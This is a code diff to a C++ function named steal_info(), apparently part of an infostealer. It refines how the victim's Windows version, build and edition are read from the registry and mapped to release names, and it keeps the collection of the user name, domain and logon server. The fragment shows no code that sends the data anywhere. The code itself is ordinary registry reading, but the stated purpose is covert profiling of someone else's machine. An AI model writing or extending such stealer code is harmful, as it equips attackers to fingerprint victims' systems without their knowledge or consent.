@@ -413,16 +413,62 @@ void steal_info()
     }
 
     // --- OS ---
-    add_line("OS Name", regStr(HKEY_LOCAL_MACHINE,
-        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName"));
+    {
+        std::string osName = regStr(HKEY_LOCAL_MACHINE,
+            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
+        std::string buildStr = regStr(HKEY_LOCAL_MACHINE,
+            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuild");
+        std::string editionID = regStr(HKEY_LOCAL_MACHINE,
+            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"EditionID");
+        int buildNum = atoi(buildStr.c_str());
+
+        // map build → friendly version per https://www.gaijin.at/en/infos/windows-version-numbers
+        bool isServer = (osName.find("Server") != std::string::npos);
+        const char* verName = nullptr;
+        if (isServer) {
+                 if (buildNum >= 26100) verName = "Server 2025";
+            else if (buildNum >= 20348) verName = "Server 2022";
+            else if (buildNum >= 17763) verName = "Server 2019";
+            else if (buildNum >= 14393) verName = "Server 2016";
+            else if (buildNum >=  9600) verName = "Server 2012 R2";
+            else if (buildNum >=  9200) verName = "Server 2012";
+            else if (buildNum >=  7601) verName = "Server 2008 R2";
+            else if (buildNum >=  6002) verName = "Server 2008";
+        } else {
+                 if (buildNum >= 26100) verName = "11 24H2";
+            else if (buildNum >= 22631) verName = "11 23H2";
+            else if (buildNum >= 22621) verName = "11 22H2";
+            else if (buildNum >= 22000) verName = "11 21H2";
+            else if (buildNum >= 19045) verName = "10 22H2";
+            else if (buildNum >= 19044) verName = "10 21H2";
+            else if (buildNum >= 19043) verName = "10 21H1";
+            else if (buildNum >= 19042) verName = "10 20H2";
+            else if (buildNum >= 19041) verName = "10 2004";
+            else if (buildNum >= 18363) verName = "10 1909";
+            else if (buildNum >= 18362) verName = "10 1903";
+            else if (buildNum >= 17763) verName = "10 1809";
+            else if (buildNum >= 17134) verName = "10 1803";
+            else if (buildNum >= 16299) verName = "10 1709";
+            else if (buildNum >= 15063) verName = "10 1703";
+            else if (buildNum >= 14393) verName = "10 1607";
+            else if (buildNum >= 10586) verName = "10 1511";
+            else if (buildNum >= 10240) verName = "10 1507";
+            else if (buildNum >=  9600) verName = "8.1";
+            else if (buildNum >=  9200) verName = "8";
+            else if (buildNum >=  7601) verName = "7 SP1";
+            else if (buildNum >=  7600) verName = "7";
+        }
+
+        if (verName) osName = std::string("Windows ") + verName + " (" + editionID + ")";
+        osName += " Build " + buildStr;
+        add_line("OS Name", osName);
+    }
 
     // --- User ---
     if (GetEnvironmentVariableW(L"USERNAME", buf, 512))
         add_line("User Name", w2s(buf));
     if (GetEnvironmentVariableW(L"USERDOMAIN", buf, 512))
         add_line("User Domain", w2s(buf));
-    if (GetEnvironmentVariableW(L"USERPROFILE", buf, 512))
-        add_line("User Profile", w2s(buf));
     if (GetEnvironmentVariableW(L"LOGONSERVER", buf, 512))
         add_line("PC Name", w2s(buf));
 
